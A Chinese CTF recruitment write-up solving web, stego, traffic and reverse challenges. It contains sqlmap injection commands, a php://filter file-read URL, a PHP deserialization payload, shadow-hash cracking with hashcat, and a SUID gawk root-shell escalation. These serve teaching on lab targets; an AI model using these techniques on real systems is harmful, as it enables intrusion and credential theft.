# L3H Sec 招新题目WriteUp

​											注：使用Typora浏览效果更佳

[TOC]

## Web

### Web1

#### 第一关

“请使用百度爬虫访问此页面”，通过headers中加入**百度蜘蛛（爬虫）的User Agent**实现模拟百度爬虫访问页面。

```python
import requests
headers = {
    'User-Agent': "Mozilla/5.0 (compatible;Baiduspider/2.0; + http://www.baidu.com/search/spider.html;"
}
s = requests.get("http://103.35.75.161/", headers=headers)
print(s.text)

```

![Screen Shot 2019-01-20 at 2.45.04 PM](https://ws1.sinaimg.cn/large/006tNc79gy1fzd1rao8kqj30ko03cmxf.jpg)

得到Flag：**flag{L3H_Le7_Us_st9rt}**

同时得到第二关入口：

http://103.35.75.161/sql1n.php

---

#### 第二关

![Screen Shot 2019-01-20 at 2.50.40 PM](https://ws1.sinaimg.cn/large/006tNc79gy1fzd1x0iyjbj31eg0e4jsg.jpg)

由url可知需要用到sql相关知识，页面内容和hint更是证实了这一猜想。

有登录框，考虑post注入。在账号密码处分别输入“ ’ ”，发现均报错，说明存在漏洞。

![](https://ws3.sinaimg.cn/large/006tNc79ly1fzgba2njd1j31sy0esq4t.jpg)

![](https://ws2.sinaimg.cn/large/006tNc79ly1fzgbawl0q7j31pi0ditak.jpg)

接下来，Burp Suite抓一下包。

![](https://ws3.sinaimg.cn/large/006tNc79gy1fzgbc4k0q8j31gg0fa0wd.jpg)

将抓到的包保存到`data.txt`中备用。

构造`select * from admin where username=’’ or '1'='1‘--‘ and password=’password‘`这样的SQL语句，即用户名处输入’ or '1'='1‘--，发现行不通，提示`No dangerous character`。看来页面做了危险字符过滤。

把所有空格替换成`%a0`，不再提示No dangerous character，重新提示执行失败，说明做了空格过滤。

上sqlmap：

先注入

`python sqlmap.py -r data.txt --tamper=space2comment.py`

发现以下注入点：

![Screen Shot 2019-01-27 at 6.23.23 AM](https://ws2.sinaimg.cn/large/006tNc79ly1fzkqlfj7ncj30vs0hogvt.jpg)

查看数据库

`python sqlmap.py -r data.txt --tamper=space2comment.py --dbs`

![Screen Shot 2019-01-27 at 6.25.29 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzkqngtdz6j309w04w3zh.jpg)

查看当前数据库

`python sqlmap.py -r data.txt --tamper=space2comment.py --current-db`

![Screen Shot 2019-01-27 at 6.27.22 AM](https://ws2.sinaimg.cn/large/006tNc79ly1fzkqpeep1rj30b800yaa5.jpg)

查看当前数据库下的tables

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin --table`

![Screen Shot 2019-01-27 at 6.32.15 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzkqujejmfj306e0403yu.jpg)

查看user的列

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin -T user --columns`

![Screen Shot 2019-01-27 at 6.32.52 AM](https://ws1.sinaimg.cn/large/006tNc79ly1fzkqws1uagj308a076dgx.jpg)

查看password对应键值

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin -T user -C password --dump`

![Screen Shot 2019-01-27 at 6.31.42 AM](https://ws4.sinaimg.cn/large/006tNc79ly1fzkqtye086j30b207gwfq.jpg)

拿到flag：**flag{L3H_fUnnY_S9L_1n}**

---

#### 第三关

根据上一步的提示，访问/include.php（或者直接用御剑也能扫到），点击页面内"点一下，玩一年"，在弹出的joke.php页面检查一下元素，发现hint：

`<!-- hint:Try to read this file using Base64 encoding-->`

这里“this file”很迷，是指joke.php还是include.php呢？这里的encoding也很有意思，英文里“encode/encoding”一词既可以指“编码”，也可以指“（利用某种编码）译成密码（的过程）”。我刚开始还以为要在本地对php文件做base64加密，后来经过研究才发现，这步是利用php伪协议，直接用base64编码访问include.php，与joke.php无关。

附：网上对php://filter的解释如下：

> 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。

直接访问：

```
http://103.35.75.161/include.php?file=php://filter/read=convert.base64-encode/resource=include.php
```

得到：

```
77u/PD9waHANCmhlYWRlcigiQ29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7DQplcnJvcl9yZXBvcnRpbmcoMCk7DQppZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5jbHVkZS5waHA/ZmlsZT1qb2tlLnBocCI+54K55LiA5LiLLOeOqeS4gOW5tDwvYT4nO30NCiRmaWxlPSRfR0VUWydmaWxlJ107DQppZihzdHJzdHIoJGZpbGUsInBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmNsdWRlLnBocCIpIG9yIHN0cnN0cigkZmlsZSwicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWRtc2ouYmFrLnBocCIpKQ0Ke2luY2x1ZGUoJGZpbGUpO30NCmVsc2UgaWYoaXNzZXQoJGZpbGUpKXsNCiAgICBlY2hvICJvb29wcywgeW91IGFyZSByZWFsbHkgYSBiYWQgaGFja2VyIjsNCiAgICBlY2hvICI8IS0tIGhpbnQ6VHJ5IHRvIHJlYWQgdGhpcyBmaWxlIHVzaW5nIEJhc2U2NCBlbmNvZGluZy0tPiI7DQogICAgZXhpdCgpOw0KfQ0KDQovL2ZsYWd7TDNIX0ZpTDNfSW5jTHVzMTBuX0lTX04wN19zQGYzfQ0KLy9uZXh0X2xldmVsIDogZG1zai5w
```

base64解密得

```php+HTML
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
if(!$_GET[file]){echo '<a href="./include.php?file=joke.php">点一下,玩一年</a>';}
$file=$_GET['file'];
if(strstr($file,"php://filter/read=convert.base64-encode/resource=include.php") or strstr($file,"php://filter/read=convert.base64-encode/resource=dmsj.bak.php"))
{include($file);}
else if(isset($file)){
    echo "ooops, you are really a bad hacker";
    echo "<!-- hint:Try to read this file using Base64 encoding-->";
    exit();
}

//flag{L3H_FiL3_IncLus10n_IS_N07_s@f3}
//next_level : dmsj.p
```

拿到flag：**flag{L3H_FiL3_IncLus10n_IS_N07_s@f3}**

---

#### 第四关

上一步解密得到的base64字符串（include.php完整内容）中发现这样一行：

```php
strstr($file,"php://filter/read=convert.base64-encode/resource=dmsj.bak.php")
```

直接访问`http://103.35.75.161/include.php?file=php://filter/read=convert.base64-encode/resource=dmsj.bak.php`，同样base64解密，得到

```php+HTML
<?php
header("Content-type:text/html;charset=utf-8");
$md51 = md5('QNKCDZO');
$a =@$_GET['a'];
$md52 = md5($a);
if (isset($a)){
    if ($a!='QNKCDZO' && $md51==$md52){
        echo "<font size='10cm' color='green'>flag{***********}</font><br><br>";
                echo "<font size='10cm' color='green'><a href='**********'>终极挑战</a></font>";
    }else{
        echo "<font size='10cm' color='red'>错误!</font>";
    }
}else{
    echo "<font size='10cm' color='orange'>请传入a的值</font>";
}
```

循着next_level的提示访问dmsj.php，弹出

![Screen Shot 2019-01-27 at 12.08.32 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzl0ktkivej30fq046mxe.jpg)

发现和dmsj.bak.php的内容相吻合。故dmsj.bak.php的完整源码可以辅助我们解dmsj.php。

查看dmsj.php源码，发现hint：

`<!-- 
hint: You may need to use something from the previous level
hint: dmsj.bak.php
-->`

与刚刚的推断相吻合。

关注源码中这一部分

```php
...
$md51 = md5('QNKCDZO');
$a =@$_GET['a'];
$md52 = md5($a);
if (isset($a)){
    if ($a!='QNKCDZO' && $md51==$md52){
...
```

可见a要输入一个md5和QNKCDZO相等但不是QNKCDZO的字符串。严格来讲这样的字符串是几乎不可能找到的，但联想到PHP语言的弱类型，又发现QNKCDZO的md5为`0e830400451993494058024219903391`，一切就明了了。

> PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。

而0exxxxxxx如果做科学计数法来理解其值恒为0，如此一来我们只需找到一个md5加密后密文开头为0e的字符串就好了。`240610708`就是一个。

直接访问`http://103.35.75.161/dmsj.php?a=240610708`，拿到flag：**flag{L3H_d0ub13_eQu@l_Is_s0_fUn}**

---

#### 第五关

来到最后一步啦

![Screen Shot 2019-01-27 at 12.32.37 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzl19i3n2bj31e60cm76a.jpg)

看样子又像base64编码，解密5次，得

```
<?cuc
	reebe_ercbegvat(0);
	rpub "Pbatenghyngvbaf ba lbhe neeviny ng gur ynfg yriry <oe><oe>";
	rpub "Lbh ner bayl bar fgrc fubeg bs lbhe svany fhpprff <oe><oe>";
	rpub "Ohg vg frrzf n yvggyr qvssvphyg :)<oe><oe>";
  pynff Luxgdy{ 
    cebgrpgrq $svyr='onx.cuc';
    shapgvba __qrfgehpg(){ 
      vs(!rzcgl($guvf->svyr)) {
       vs(fgepue($guvf-> svyr,"\\")===snyfr &&  fgepue($guvf->svyr, '/')===snyfr)
          fubj_fbhepr(qveanzr (__SVYR__).'/'.$guvf ->svyr);
       ryfr      qvr('Jebat svyranzr.');
      }}  
    shapgvba __jnxrhc(){ $guvf-> svyr='onx.cuc'; } 
    choyvp shapgvba __gbFgevat(){erghea '' ;}}     
    vs (!vffrg($_TRG['uhfg'])){ fubj_fbhepr('onx.cuc'); } 
    ryfr{ 
       $svyr=onfr64_qrpbqr( $_TRG['uhfg']); 
       rpub hafrevnyvmr($svyr ); } 
 ?>
```

php文件开头应该是`<?php`，这里是`<?cuc`，看样子很像凯撒密码啊。偏移量13，解密得

```php+HTML
<?php 
    error_reporting(0); 
    echo "Welcome to the final test! <br><br>"; 
    echo "There is only one step short to your final success <br><br>"; 
    echo "But it seems a little difficult :)<br><br>"; 
  class Yhktql{  
    protected $file='bak.php'; 
    function __destruct(){  
      if(!empty($this->file)) { 
       if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false) 
          show_source(dirname (__FILE__).'/'.$this ->file); 
       else      die('Wrong filename.'); 
      }}   
    function __wakeup(){ $this-> file='bak.php'; }  
    public function __toString(){return '' ;}}      
    if (!isset($_GET['hust'])){ show_source('bak.php'); }  
    else{  
       $file=base64_decode( $_GET['hust']);  
       if(strstr($file,"F1n4L_t3sT.php")) 
       echo unserialize($file ); }  
 ?>
```

（一定要注意大小写！！！）

果不其然，`http://103.35.75.161/F1n4L_t3sT.php`源码中

![Screen Shot 2019-01-27 at 12.41.02 PM](https://ws4.sinaimg.cn/large/006tNc79ly1fzl1i87k6ej30vo02swev.jpg)

再次验证了前面得到的结论。

分析php源码，可以利用PHP反序列化漏洞。参考`https://blog.csdn.net/fly_hps/article/details/82736992`，构造payload

`O:6:"Yhktql":2:{S:7:"\00*\00file";s:14:"F1n4L_t3sT.php";}`

将其转换为Base64再加上前面的php目录和get变量名，得完整url：

`http://103.35.75.161/F1n4L_t3sT.php?hust=Tzo2OiJZaGt0cWwiOjI6e1M6NzoiXDAwKlwwMGZpbGUiO3M6MTQ6IkYxbjRMX3Qzc1QucGhwIjt9`。

![Screen Shot 2019-01-27 at 7.36.09 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzldi91e0vj312a0si7bb.jpg)

访问即得flag：**flag:{W3Lc0m3_tO_L3H!_Ple@SE_cONt@Ct_Mr6} **

---

### Web2

#### 第一关

cmd下ipconfig命令找到**VMware Network Adapter VMnet8**的ipv4地址为192.168.52.1。使用Nmap扫描**VMware Network Adapter VMnet8**网卡的NAT网段C段IP，即可找到虚拟机IP，命令：

`nmap -sP 192.168.52.1/24`。

共找到三个ip：192.168.52.254 192.168.52.128 192.168.52.1。接着`nmap -A <ip>`找开放端口，192.168.52.128找到一个http端口80。

Firefox（Edge Chrome都不行）下登入192.168.52.128，发现http basic认证的问候语`ZDJWaWFIVnpkR1Z5T21oMWMzUXhNak14TWpNeE1qTT0=`，等于号结尾初步判断base64加密，解密2次得`webhuster:hust123123123`，以此作为用户名密码登录。

![捕获5](https://ws3.sinaimg.cn/large/006tNc79ly1fzk63gre2gj312g07x3zu.jpg)

得到flag：**flag1{H4ppy_P1ay_W17h_B64}**以及Next flag的提示。

---

#### 第二关

F12审查元素看到strange things的提示，http://ctf.ssleye.com/cvencode.html做核心价值观解码，得到`/Secret_file_is_here.zip`。把zip下载下来，拿到第二个flag：**flag2{B1B1B1B1_1s_1nte2es7inG}**。

---

#### 第三关

flag3此时也唾手可得，爆破一下zip6位密码，`584925`。flag：**flag3{N0t_A_web_eXpl0it}**

---

#### 第四关

按照提示接着对txt文件做35次base64解密。附python代码：

```python
import base64
with open('A_Very_Big_File_1s_herE.txt', "r") as f:
    string = f.read()
# print(string)
for i in range(35):
    string = base64.b64decode(string)
print(string)
```

得到解密后字符串：`b'flag4{Py7h0n_1s_A_usefu1_T00l}\n\nnext flag is here: /Redirect_Redirect_Redirect.html\n\nYou may need a tool named: Burp Suite\n'`

第4个flag：**flag4{Py7h0n_1s_A_usefu1_T00l}**

---

#### 第五关

`http://192.168.52.128/Redirect_Redirect_Redirect.html`一秒就跳转到`http://192.168.52.128/no_key_is_here_forever.html`，来不及看页面内容。遂Burp Suite抓包，Proxy->Options->Match and Replace->Add->输入"^Location.*$"，以防网页重定向。或者在Target->Site Map中也可在对应网页Response->Raw中看到页面内容。flag5：**flag5{BURP_burp_b1bbuu2ur3rrpp4p}**![捕获6](https://ws2.sinaimg.cn/large/006tNc79ly1fzk63pvzk2j30ke07ewes.jpg)

---

#### 第六关

sqlmap命令：

先注入

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123"`

![捕获8](https://ws4.sinaimg.cn/large/006tNc79ly1fzk640i8skj30zo0ikmya.jpg)

查看数据库

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" --dbs`

![捕获7](https://ws1.sinaimg.cn/large/006tNc79ly1fzk649mg2jj30ib06k3yj.jpg)

查看当前数据库

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" --current-db`

![捕获9](https://ws2.sinaimg.cn/large/006tNc79ly1fzk64jfunjj30jr02cq2t.jpg)

查看当前数据库下的tables

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf --table`

![捕获10](https://ws2.sinaimg.cn/large/006tNc79ly1fzk64optwxj30pi07ojre.jpg)

查看flag_is_here的列

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here --columns`

![捕获11](https://ws3.sinaimg.cn/large/006tNc79ly1fzk65rfpoqj30zp0cd74j.jpg)

查看username对应键值

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here -C username --dump`

![捕获12](https://ws1.sinaimg.cn/large/006tNc79ly1fzk65nela8j313c0bot8w.jpg)

拿到flag6： **flag6{D0_Youu_Kn0w_PDO_PDO_PDO}**

---

#### 第七关

查看password_hash对应键值

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here -C password_hash --dump`

![捕获13](https://ws1.sinaimg.cn/large/006tNc79ly1fzk65w6mvwj31ky0bkq3h.jpg)

按照提示，用hashcat挂载rockyou_dict.txt字典文件解密/etc/shadow密码， 密文字符串格式为：\$id\$salt\$encrypted

`$6$7SRCnV5i$IbD6jUjR5WpStPtruqrLzaD08Ao7PpmIA8LywHWvz8pgmpVzZmVpksG7ZYcF5imDHYB9s35XFOa2PiU.xUBdg0`

| ID   |                            Method                            |
| ---- | :----------------------------------------------------------: |
| 1    |                             MD5                              |
| 2a   | Blowfish(not in mainline glibc;added in some Linux distribution) |
| 5    |                   SHA-256(since glibc 2.7)                   |
| 6    |                   SHA-512(since glibc 2.7)                   |

id为6，说明SHA-512加密。查询帮助文档可知，代号1800对应`sha512crypt $6$, SHA512 (Unix)`

用命令`hashcat64.exe -a 0 -m 1800 -o output.txt input.txt rockyou_dict.txt -O`

爆破密码，得`santiago7941`。

注：因为我使用的是Macbook，只有一个垃圾集显，爆破密码跑不快，故我用谷歌免费GPU平台Google Colab跑了一下。需要先在Colab上部署hashcat：`!hashcat -a 0 -m 1800 -o output.txt input.txt rockyou_dict.txt -O`（!开头以执行linux指令）

回到VMware Workstation，输入登录名：huster，密码：santiago7941，拿到第七个flag：**flag7{hAsh_0at\_!_p0werfu1}**

![捕获14](https://ws4.sinaimg.cn/large/006tNc79ly1fzk657cw6cj30up09g3zp.jpg)

---

#### 第八关

从hint8.txt入手，编码由+-[]<>.构成，乃BrainFuck编码，`https://www.nayuki.io/page/brainfuck-interpreter-javascript`解码得

`You can Google: suid privilege escalation and this site maybe helpful https://gtfobins.github.io/`

注：Linux虚拟机下不太方便把txt导出来，我直接OCR识别的

下面的命令可以发现所有的系统中有SUID权限的可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![捕获16](https://ws3.sinaimg.cn/large/006tNc79ly1fzk650jxcyj30ra0dsgn9.jpg)

将`https://gtfobins.github.io/`中有SUID或Limited SUID标签的Unix Binaries和上图中的文件相匹配，找到一个gawk（gnu awk）。先用`which gawk`找到gawk所在目录`/usr/bin/gawk`，再根据`https://gtfobins.github.io/gtfobins/awk/#limited-suid`网页上的说明，虚拟机中执行`/usr/bin/gawk 'BEGIN {system("/bin/sh")}'`，拿到root权限的shell。

![Screen Shot 2019-01-26 at 5.55.23 PM](https://ws4.sinaimg.cn/large/006tNc79ly1fzk4z3wyvtj30ra02y74c.jpg)

最后用`cat /root/you_win.txt`打印出最后一个flag：**flag8{We1comE_T0_L3H_TeAm}**



## Crypto & Misc

### Picture

Kali Linux下用Steghide分析一下nogamenolife.jpg，发现图片中藏了一个RAR：

![Screen Shot 2019-01-20 at 4.37.34 PM](https://ws2.sinaimg.cn/large/006tNc79gy1fzd54owbquj31ay08i0wc.jpg)

用binwalk的-e命令或者windows下winhex等软件分离出rar文件。

![Screen Shot 2019-01-20 at 4.42.22 PM](https://ws3.sinaimg.cn/large/006tNc79gy1fzd567wejkj31as08y43u.jpg)

将RAR文件解压，得到一个png一个txt。

![Screen Shot 2019-01-20 at 4.44.23 PM](https://ws2.sinaimg.cn/large/006tNc79gy1fzd57jqtalj30wi0bajtb.jpg)

一看png文件名，可知要用lsb隐写。拖到stegsolve里面研究一下，啥也没发现。

结合password.txt分析，考虑原图可能是用专门隐写工具加密的。遂寻找其他png隐写工具，发现一款cloacked-pixel。该工具引用Crypto库，使用python2.7在terminal中执行：（python3.x下需特殊配置）

`python2.7 lsb.py extract lsb-stego.png result hustctf`

![Screen Shot 2019-01-21 at 9.08.12 AM](https://ws1.sinaimg.cn/large/006tNc79ly1fzdxnfwiscj30vo038tae.jpg)

winhex打开result文件，发现`52617221`的文件头，经查询可知对应rar文件。

![Screen Shot 2019-01-21 at 9.15.50 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzdxv5hw84j30hk044aad.jpg)加.rar后缀解压得txt文件，flag在其中。

**flag{l3h_no_game_no_life}**

---

### Traffic1

**先看tip：**

> tip1:对Rar文件头的十六进制数要敏感
>
>
> tip2:密码在流量包中（HTTP）
>
> \- .... . ..--.- .--. .- ... ... .-- --- .-. -.. ..--.- .. ... ..--.- . -. -.-. .-. -.-- .--. - . -.. ..--.- -... -.-- ..--.- .--- ... ..-. ..- -.-. -.-

**Tip分析：**

Tip1 rar的文件头为`52617221`,上一道图片隐写题最后也用到了。

Tip2 暂时没什么用

Tip最后面那串摩尔斯电码解密得`THE_PASSWORD_IS_ENCRYPTED_BY_JSFUCK`，说明密码是由JSFUCK这种编码方式加密而成的。不妨称之为Tip3



打开secret.log，表面一堆乱码和英文字符（貌似是三星Galaxy C5的设备信息）穿插在一起，定睛一瞧中间有一组数字串，开头是52617221，tip1用上了。

![](https://ws1.sinaimg.cn/large/006tNc79ly1fze0klkdmej310205uae9.jpg)

用winhex将数字串保存为一个rar，发现rar里面有个flag.txt，看来方向没错，只不过flag.txt上了密码，还得费一番功夫。

回过头来看tip2，使用wireshark打开流量包找密码，检索区间为http协议。密码构成方式呢，应该是`()+[]!`这六个字符，也就是JSFUCK编码。tip3这样一来也用上了。

Wireshark过滤出http协议，没翻多久就找到了一堆括号加号感叹号（不得不说jsfuck太明显了）

![](https://ws4.sinaimg.cn/large/006tNc79ly1fze0m8ankfj31c00u0nkr.jpg)



chrome随便开一网页，F12->Console->将JSFUCK代码输进去->Enter,弹窗中弹出解密后文本（也即是我们想要的密码）。

![](https://ws1.sinaimg.cn/large/006tNc79ly1fze1c6kv0ej30ow07cgm2.jpg)

或者`http://www.jsfuck.com`网站也可完成JSFUCK解密。

有了压缩包密码，解压flag.txt即得flag。

**flag{l3h_tr4_ffic_4n4_lys3}**

---

### Misc

使用VMware Workstation试图打开虚拟机文件，发现要密码。在tip.docx中寻找灵感，什么有用信息都没有。考虑到Word可作为信息隐藏的载体，遂MS Word依次点击文件->选项->显示，将“隐藏文字”处打勾，发现隐藏的虚拟机密码`hust123`。

![捕获](https://ws1.sinaimg.cn/large/006tNc79ly1fzfrpscyg5j30oo0i5gu0.jpg)

大大的表情包摆在那里，以为有什么名堂。把表情包从word里提取出来放stegsolve和steghide里检测，一无所获。

使用密码`hust123`登进虚拟机，发现还要输Linux用户名和密码。但我不知道啊！用常见的root，admin之类的配上hust123混搭了一下发现不行，遂放弃，另寻出路。到最后我才明白，此乃障眼法。根本无需实际登陆进linux系统，因为vmdk文件本身就是信息隐藏的绝佳载体。

直接上winhex，搜索flag、txt、ctf等字样，最终在搜索flag.txt时在`Ubuntu 64 位-s005.vmdk`中发现有flag.txt和success.txt两文件藏在一个zip包中。（zip文件头`504B0304` 文件尾`504B0506`）。将该zip文件Paste Into New File，另存为zip格式，用密码`hust123`（原来是干这个用的）解压zip即得最终flag。

![捕获1](https://ws1.sinaimg.cn/large/006tNc79ly1fzfrpesbf6j31ol0fqac4.jpg)

**flag{hust_St3_g4n0_gr4_phy}**



## Reverse

### Welcome

Notepad++打开`Welcome`文件，发现文件头为elf。用IDA打开。

将main函数反编译（F5），得到![捕获](https://ws4.sinaimg.cn/large/006tNc79ly1fzrr03olt1j30pt09bdg1.jpg)

发现是一个简单的strcmp判断，第一个参数为输入的字符串，第二个参数估计是待比较的字符串，极有可能是flag。第三个参数是十六进制的C，也就是十进制的12。定位到strcmp原函数，发现第三个形参为`size_t n`，应该代表字符串的长度。

回到main函数，在s2处双击，定位到`.data:0000000000004040 s2    dq offset aWelc0me2l3hrec`这样一行。再双击`aWelc0me2l3hrec`，定位到`.rodata:0000000000002004 aWelc0me2l3hrec db 'Welc0me2L3HRecruit!',0`。单引号内即为flag。考虑到strcmp只比较12位，将`Welc0me2L3HRecruit!`的前12位作为flag提交。flag: **Welc0me2L3HR**。

---

### Encryption

用PEID打开`Level1.exe`，发现aspack的壳。

![捕获2](https://ws4.sinaimg.cn/large/006tNc79ly1fzrr13fr6cj30nb0dljrw.jpg)

下面来脱壳：

经试验Win10 64位版和Win XP 32位版环境下均无法用Ollydbg或脱壳工具脱壳，故我找了一个Win7 64位的虚拟机。

**方法1：**

手动脱壳：

> 参考 `https://www.52pojie.cn/thread-373804-1-1.html`

Ollydbg载入，F7跳转到call语句。右面寄存器窗口ESP处右键->数据窗口中跟随。![捕获3](https://ws3.sinaimg.cn/large/006tNc79ly1fzrr15culbj313s0higob.jpg)

左下角窗口在ESP的地址处设置断点（断点->硬件访问->Word）

![捕获4](https://ws3.sinaimg.cn/large/006tNc79ly1fzrr1m4p9oj30ne0ghgo1.jpg)

F9继续运行，跳转到jnz处（条件判断，不为0时跳转 ）。删除断点（调试->硬件断点->删除1），然后按三次F7跳转到如图位置。

![捕获5](https://ws2.sinaimg.cn/large/006tNc79ly1fzrr1him9rj30m907vwep.jpg)

在紫色处右键->用Ollydump脱壳调试进程->脱壳->保存文件。

------

**方法2**

工具脱壳：

直接上`Aspack Striper`，一键式操作，不再赘述。

------

脱壳后再次用PEiD检测，发现壳已脱去

![捕获6](https://ws4.sinaimg.cn/large/006tNc79ly1fzrr1g112tj30hz0afab4.jpg)

IDA载入脱壳后的exe文件，在IDA view窗口可以大致看清楚程序的运行流程。总共两个输入，一个secret code，输对了接着输入flag，两个都对了才宣告成功。

接着，对main函数反编译。

![捕获8](https://ws4.sinaimg.cn/large/006tNc79ly1fzrr1dzkhpj30kp0lfmxn.jpg)

对于**第一个输入**，处理起来有两种方法：

**第一种：改变输入验证的逻辑**

Ollydbg载入exe，右键查找->所有参考文本字串。

通过“Wrong code”和“And now, give me your flag”的字样来到je语句处。

![捕获9](https://ws1.sinaimg.cn/large/006tNc79ly1fzrr1ch5gaj30zk0a4jt3.jpg)

将je改成jnz，保存为可执行文件。

------

**第二种：解出 secret code**

分析反编译后的代码，得到这一等式：

`v6(用户输入的) ^ 0xCAFEBABE = -559038737`

解得 v6 = 340984913

> 附竖式运算过程：

   0001 0100 0101 0011 0000 0100 0101 0001

**^** 1100 1010 1111 1110 1011 1010 1011 1110

\--------------------------------------------------------------------

**=** 1101 1110 1010 1101 1011 1110 1110 1111

`0001 0100 0101 0011 0000 0100 0101 0001`转换为十进制为`340984913`

------

继续来看**第二个输入**。分析反编译后的代码（第17行到第35行），写得很明白就不赘述了。特别注意到第26行有个` if ( byte_403370[v5] != byte_4021F0[v5] )`，双击来到这里：

![捕获10](https://ws1.sinaimg.cn/large/006tNc79ly1fzrr1aeq1oj30mz03q0so.jpg)

分析可知，是将004021F0、004021F1和00402207地址的这些Hex值以及字符作为每次if判断的依据。

写个C语言小程序吧

```c
#include <stdio.h>
int v5;
char output_array[30];
char c,output;
int d,i,j;
int main()
{
    while (1)
    {
        printf("请输入类型：【1】十六进制数 【2】字符\n");
        int type;
        scanf("%d\n",&type);
        if(type==2)
        {
            c = getchar();
            output = (v5+++26) ^ c;
        }
        if(type==1) {
            scanf("%x", &d);
            output = (v5+++26) ^ d;
        }
        output_array[i]=output;
        for(j=0;j<=i;j++)
            printf("%c",output_array[j]);
        i++;
        printf("\n");
    }
    return 0;
}
```

------

**注：**本人初学，一直没找到IDA的Hex View窗口，所以前面处理起来费了半天劲。其实可以直接在Hex View窗口定位到004021F0处，将Hex值直接拷贝下来（两个数字/字母为一组，按byte读取）

`7C 77 7D 7A 65 5A 14 72 5B 7C 7C 15 74 78 1B 47 69 59 55 5D 5A 1E 00 5F 4F`

```c
int v5;
char output_array[30];
int i;
#include <stdio.h>
int main()
{
    int data[] = {0x7C,0x77,0x7D,0x7A,0x65,0x5A,0x14,0x72,0x5B,0x7C,0x7C,0x15,0x74,0x78,0x1B,0x47,0x69,0x59,0x55,0x5D,0x5A,0x1E,0x00,0x5F,0x4F};
    for(i=0;i<25;i++)
        output_array[i] = (v5+++26) ^ data[i];
    for(i=0;i<25;i++)
        printf("%c",output_array[i]);
    return 0;
}
```

得到flag：**flag{E4Sy_X0R_3nCrypt10n}**

![捕获11](https://ws1.sinaimg.cn/large/006tNc79ly1fzrr175df3j30xx08smxk.jpg)

---

### Maze

Ollydbg载入`maze.exe`，查找所有参考文本字串，发现迷宫图形。

![Screen Shot 2019-02-03 at 8.44.03 AM](https://ws4.sinaimg.cn/large/006tNc79ly1fzsy1ho0r4j30sk08e76s.jpg)

IDA载入`maze.exe`，反编译各个函数，在sub_402CB0中找到迷宫图形。

```c
int sub_402CB0()
{
  _BYTE *v0; // esi@1
  void *v1; // edi@1
  signed int v2; // edi@1
  unsigned int v3; // esi@1
  char v4; // bl@4
  int v5; // eax@21
  int v7; // [sp+18h] [bp-174h]@1
  _BYTE *v8; // [sp+1Ch] [bp-170h]@1
  char v9; // [sp+2Bh] [bp-161h]@1
  char v10; // [sp+2Ch] [bp-160h]@1
  char v11; // [sp+2Dh] [bp-15Fh]@1
  char v12; // [sp+2Eh] [bp-15Eh]@1
  char v13; // [sp+2Fh] [bp-15Dh]@1
  char v14; // [sp+30h] [bp-15Ch]@1
  char v15; // [sp+31h] [bp-15Bh]@1
  char v16; // [sp+32h] [bp-15Ah]@1
  char v17; // [sp+33h] [bp-159h]@1
  char v18; // [sp+34h] [bp-158h]@1
  char v19; // [sp+35h] [bp-157h]@1
  char v20; // [sp+36h] [bp-156h]@1
  char v21; // [sp+37h] [bp-155h]@1
  char v22; // [sp+38h] [bp-154h]@1
  char v23; // [sp+39h] [bp-153h]@1
  char v24; // [sp+3Ah] [bp-152h]@1
  char v25; // [sp+3Bh] [bp-151h]@1
  char v26; // [sp+3Ch] [bp-150h]@1
  char v27; // [sp+3Dh] [bp-14Fh]@1
  char v28; // [sp+3Eh] [bp-14Eh]@1
  char v29; // [sp+3Fh] [bp-14Dh]@1
  char v30; // [sp+40h] [bp-14Ch]@1
  char v31; // [sp+41h] [bp-14Bh]@1
  char v32; // [sp+42h] [bp-14Ah]@1
  char v33; // [sp+43h] [bp-149h]@1
  char v34; // [sp+44h] [bp-148h]@1
  char v35; // [sp+45h] [bp-147h]@1
  char v36; // [sp+46h] [bp-146h]@1
  char v37; // [sp+47h] [bp-145h]@1
  char v38; // [sp+48h] [bp-144h]@1
  char v39; // [sp+49h] [bp-143h]@1
  char v40; // [sp+4Ah] [bp-142h]@1
  char v41; // [sp+4Bh] [bp-141h]@1
  char v42; // [sp+4Ch] [bp-140h]@1
  char v43; // [sp+4Dh] [bp-13Fh]@1
  char v44; // [sp+4Eh] [bp-13Eh]@1
  char v45; // [sp+4Fh] [bp-13Dh]@1
